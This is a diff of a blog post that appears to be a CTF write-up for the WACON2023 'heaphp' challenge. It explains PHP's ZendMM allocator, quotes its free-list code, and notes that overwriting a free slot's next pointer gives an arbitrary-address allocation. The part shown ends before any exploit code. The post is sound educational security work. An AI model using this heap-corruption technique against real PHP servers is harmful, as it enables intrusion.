@@ -59,8 +59,6 @@
     <div class="date">2023 September 14th</div>
     <div class="tags">
       
-      <div class="tag-item">CTF</div>
-      
       <div class="tag-item">PWN</div>
       
       <div class="tag-item">wp</div>
@@ -74,25 +72,154 @@
   <main class="post-content"><p>It&#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent me a long time to figure out how ZendMM actually works.</p>
 <h1 id="The-Memory-Management-of-Zend-Engine"><a href="#The-Memory-Management-of-Zend-Engine" class="headerlink" title="The Memory Management of Zend Engine"></a>The Memory Management of Zend Engine</h1><p>PHP codes are explained through the <strong>Zend engine</strong>. Instead of directly using traditional <code>malloc</code> and <code>free</code> to manage memory, Zend uses <strong>ZendMM</strong> to allocate and release memory through <code>emalloc</code> and <code>efree</code> , which efficiently serves PHP request-bound machanisms (that&#96;s another topic). </p>
 <h2 id="Basic-Structure"><a href="#Basic-Structure" class="headerlink" title="Basic Structure"></a>Basic Structure</h2><p>As writen in <code>zend_alloc.c</code> source code, all allocations are split into 3 categories: huge, large and small. Remember that zend_alloc allocates memory form OS by <strong>CHUNKS</strong>, which contains 2MB memories. Huge allocs are those who exceed a chunk. And zend_alloc use  <code>mmap</code> to allocate one. The concept of <strong>PAGE</strong> is commonly used in ZendMM, which usually contains 4KB memories. That&#96;s to say, a chunk contains 512 pages. Small allocs are less than 3&#x2F;4 of page size. The rest are Large allocs.</p>
-<p><img src="https://pic1.xuehuaimg.com/proxy/csdn/https://img-blog.csdnimg.cn/20191230114413519.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyNzgzNzAz,size_16,color_FFFFFF,t_70" alt="img"></p>
 <p>Each time a chunk is alloced, the first page of the chunk is used to record basic information about the chunk. The Structure recording information is <code>_zend_mm_chunk</code> ,(which doesn&#96;t appear in huge chunk)</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">	zend_mm_heap      *heap;</span><br><span class="line">	zend_mm_chunk     *next;</span><br><span class="line">	zend_mm_chunk     *prev;</span><br><span class="line">	<span class="type">uint32_t</span>           free_pages;				<span class="comment">/* number of free pages */</span></span><br><span class="line">	<span class="type">uint32_t</span>           free_tail;               <span class="comment">/* number of free pages at the end of chunk */</span></span><br><span class="line">	<span class="type">uint32_t</span>           num;</span><br><span class="line">	<span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>)];</span><br><span class="line">	zend_mm_heap       heap_slot;               <span class="comment">/* used only in main chunk */</span></span><br><span class="line">	zend_mm_page_map   free_map;                <span class="comment">/* 512 bits or 64 bytes */</span></span><br><span class="line">	zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">struct _zend_mm_chunk &#123;
+    zend_mm_heap      *heap;
+    zend_mm_chunk     *next;
+    zend_mm_chunk     *prev;
+    uint32_t           free_pages;				/* number of free pages */
+    uint32_t           free_tail;               /* number of free pages at the end of chunk */
+    uint32_t           num;
+    char               reserve[64 - (sizeof(void*) * 3 + sizeof(uint32_t) * 3)];
+    zend_mm_heap       heap_slot;               /* used only in main chunk */
+    zend_mm_page_map   free_map;                /* 512 bits or 64 bytes */
+    zend_mm_page_info  map[ZEND_MM_PAGES];      /* 2 KB = 512 * 4 */
+&#125;;
+</code></pre>
 <p>All the chunks form a double linked list (<code>*next</code>, <code>*prev</code>). A chunk records the usage and other detailed information of its 512 pages through <code>zend_mm_page_map</code>, <code>zend_mm_page_info</code>. Also, the <code>zend_mm_heap</code> structure merits attention.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line">	<span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">	zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line">	<span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line">	<span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line">	<span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line">	<span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">	zend_mm_chunk     *main_chunk;</span><br><span class="line">	zend_mm_chunk     *cached_chunks;			<span class="comment">/* list of unused chunks */</span></span><br><span class="line">	<span class="type">int</span>                chunks_count;			<span class="comment">/* number of allocated chunks */</span></span><br><span class="line">	<span class="type">int</span>                peak_chunks_count;		<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line">	<span class="type">int</span>                cached_chunks_count;		<span class="comment">/* number of cached chunks */</span></span><br><span class="line">	<span class="type">double</span>             avg_chunks_count;		<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line">	<span class="type">int</span>                last_chunks_delete_boundary; <span class="comment">/* number of chunks after last deletion */</span></span><br><span class="line">	<span class="type">int</span>                last_chunks_delete_count;    <span class="comment">/* number of deletion over the last boundary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line">			<span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line">			<span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">		&#125; <span class="built_in">std</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">			<span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">			<span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">		&#125; debug;</span><br><span class="line">	&#125; custom_heap;</span><br><span class="line">	HashTable *tracked_allocs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">struct _zend_mm_heap &#123;
+#if ZEND_MM_CUSTOM
+    int                use_custom_heap;
+#endif
+#if ZEND_MM_STORAGE
+    zend_mm_storage   *storage;
+#endif
+#if ZEND_MM_STAT
+    size_t             size;                    /* current memory usage */
+    size_t             peak;                    /* peak memory usage */
+#endif
+    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */
+#if ZEND_MM_STAT || ZEND_MM_LIMIT
+    size_t             real_size;               /* current size of allocated pages */
+#endif
+#if ZEND_MM_STAT
+    size_t             real_peak;               /* peak size of allocated pages */
+#endif
+#if ZEND_MM_LIMIT
+    size_t             limit;                   /* memory limit */
+    int                overflow;                /* memory overflow flag */
+#endif
 
+    zend_mm_huge_list *huge_list;               /* list of huge allocated blocks */
+
+    zend_mm_chunk     *main_chunk;
+    zend_mm_chunk     *cached_chunks;			/* list of unused chunks */
+    int                chunks_count;			/* number of allocated chunks */
+    int                peak_chunks_count;		/* peak number of allocated chunks for current request */
+    int                cached_chunks_count;		/* number of cached chunks */
+    double             avg_chunks_count;		/* average number of chunks allocated per request */
+    int                last_chunks_delete_boundary; /* number of chunks after last deletion */
+    int                last_chunks_delete_count;    /* number of deletion over the last boundary */
+#if ZEND_MM_CUSTOM
+    union &#123;
+        struct &#123;
+            void      *(*_malloc)(size_t);
+            void       (*_free)(void*);
+            void      *(*_realloc)(void*, size_t);
+        &#125; std;
+        struct &#123;
+            void      *(*_malloc)(size_t ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
+            void       (*_free)(void*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
+            void      *(*_realloc)(void*, size_t  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
+        &#125; debug;
+    &#125; custom_heap;
+    HashTable *tracked_allocs;
+#endif
+&#125;;
+</code></pre>
 <p>Mind the <code>zend_mm_free_slot</code>. The <code>ZEND_MM_BINS</code> usually is 30, which means there are 30 fixed size for small runs. As a result, there are 30 single linked list.</p>
 <h2 id="Vulnerable-Small-Runs"><a href="#Vulnerable-Small-Runs" class="headerlink" title="Vulnerable Small Runs"></a>Vulnerable Small Runs</h2><p>We mainly focus on small runs, because its vulnerable.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		omitted...</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    </span><br><span class="line">	chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">	page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">	chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line">	<span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">			i++;</span><br><span class="line">		&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">	end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">	heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">			dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">	&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		omitted...</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+&#123;
+    /*
+        omitted...
+    */
+    
+    chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);
+    page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;
+    chunk-&gt;map[page_num] = ZEND_MM_SRUN(bin_num);
+    if (bin_pages[bin_num] &gt; 1) &#123;
+        uint32_t i = 1;
 
+        do &#123;
+            chunk-&gt;map[page_num+i] = ZEND_MM_NRUN(bin_num, i);
+            i++;
+        &#125; while (i &lt; bin_pages[bin_num]);
+    &#125;
+
+    /* create a linked list of elements from 1 to last */
+    end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));
+    heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
+    do &#123;
+        p-&gt;next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
+#if ZEND_DEBUG
+        do &#123;
+            zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
+            dbg-&gt;size = 0;
+        &#125; while (0);
+#endif
+        p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
+    &#125; while (p != end);
+
+    /*
+        omitted...
+    */
+&#125;
+</code></pre>
 <p>This function is mainly used for building the small run chain when allocating  a chunk. It explains how 30 single linked chains are built. Because each part of the chain doesn&#96;t have to contain a header about its size, only leaving the fd, we may find the weird scene (compared to glibc) in the memory.</p>
 <p><img src="/../img/php-pwn.assets/image-20230914220353292.png" alt="image-20230914220353292"> </p>
 <p>When we allocate a small run:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line">		<span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">		heap-&gt;size = size;</span><br><span class="line">		heap-&gt;peak = peak;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">		heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+&#123;
+#if ZEND_MM_STAT
+    do &#123;
+        size_t size = heap-&gt;size + bin_data_size[bin_num];
+        size_t peak = MAX(heap-&gt;peak, size);
+        heap-&gt;size = size;
+        heap-&gt;peak = peak;
+    &#125; while (0);
+#endif
 
+    if (EXPECTED(heap-&gt;free_slot[bin_num] != NULL)) &#123;
+        zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];
+        heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;
+        return p;
+    &#125; else &#123;
+        return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+    &#125;
+&#125;
+</code></pre>
 <p>When we release a small run:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">	zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">		dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	p = (zend_mm_free_slot*)ptr;</span><br><span class="line">	p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">	heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num)
+&#123;
+    zend_mm_free_slot *p;
 
+#if ZEND_MM_STAT
+    heap-&gt;size -= bin_data_size[bin_num];
+#endif
+
+#if ZEND_DEBUG
+    do &#123;
+        zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
+        dbg-&gt;size = 0;
+    &#125; while (0);
+#endif
+
+    p = (zend_mm_free_slot*)ptr;
+    p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];
+    heap-&gt;free_slot[bin_num] = p;
+&#125;
+</code></pre>
 <p>Both of the functions lake security checks .If we replace the fd of it by out target address, we get an arbitrary address allocate!  That makes small runs vulnerable.</p>
 <h1 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h1><p>A typical php-pwn, we are given a docker environment and a vulnerable php extension module heaphp.so.</p>
 <p>It took me quite a long time building local php environment following the guideline on blogs. I complied php locally aming to debug it easily.  <a target="_blank" rel="noopener" href="https://learnku.com/docs/php-internals/php7/building_php/6840">This document</a> helped a lot. However, if you try to complie php with debug-symbol, the ABI of the binary will change, which makes your extension unable to load properly. That ‘s actually what I encountered. </p>
@@ -100,8 +227,53 @@
 <h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>All protection is on except Partial RELRO .The extension mainly consists of 5 functions: add, view, edit, list, delete. Because of zend engine, the pseudo-code are hard to understand (especially for noobs like me). There are tons of code of uncertain significance like:</p>
 <p><img src="/../img/php-pwn.assets/image-20230914223544720.png" alt="image-20230914223544720"></p>
 <p>Then we must dig into the basic data type in zend. That`s <code>_zend_value</code> and <code>_zval_struct</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="type">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="type">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> w1;</span><br><span class="line">		<span class="type">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> type_info;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">typedef union _zend_value &#123;
+    zend_long         lval;				/* long value */
+    double            dval;				/* double value */
+    zend_refcounted  *counted;
+    zend_string      *str;
+    zend_array       *arr;
+    zend_object      *obj;
+    zend_resource    *res;
+    zend_reference   *ref;
+    zend_ast_ref     *ast;
+    zval             *zv;
+    void             *ptr;
+    zend_class_entry *ce;
+    zend_function    *func;
+    struct &#123;
+        uint32_t w1;
+        uint32_t w2;
+    &#125; ww;
+&#125; zend_value;
 
+struct _zval_struct &#123;
+    zend_value        value;			/* value */
+    union &#123;
+        uint32_t type_info;
+        struct &#123;
+            ZEND_ENDIAN_LOHI_3(
+                zend_uchar    type,			/* active type */
+                zend_uchar    type_flags,
+                union &#123;
+                    uint16_t  extra;        /* not further specified */
+                &#125; u)
+        &#125; v;
+    &#125; u1;
+    union &#123;
+        uint32_t     next;                 /* hash collision chain */
+        uint32_t     cache_slot;           /* cache slot (for RECV_INIT) */
+        uint32_t     opline_num;           /* opline number (for FAST_CALL) */
+        uint32_t     lineno;               /* line number (for ast nodes) */
+        uint32_t     num_args;             /* arguments number for EX(This) */
+        uint32_t     fe_pos;               /* foreach position */
+        uint32_t     fe_iter_idx;          /* foreach iterator index */
+        uint32_t     property_guard;       /* single property guard */
+        uint32_t     constant_flags;       /* constant flags */
+        uint32_t     extra;                /* not further specified */
+    &#125; u2;
+&#125;;
+</code></pre>
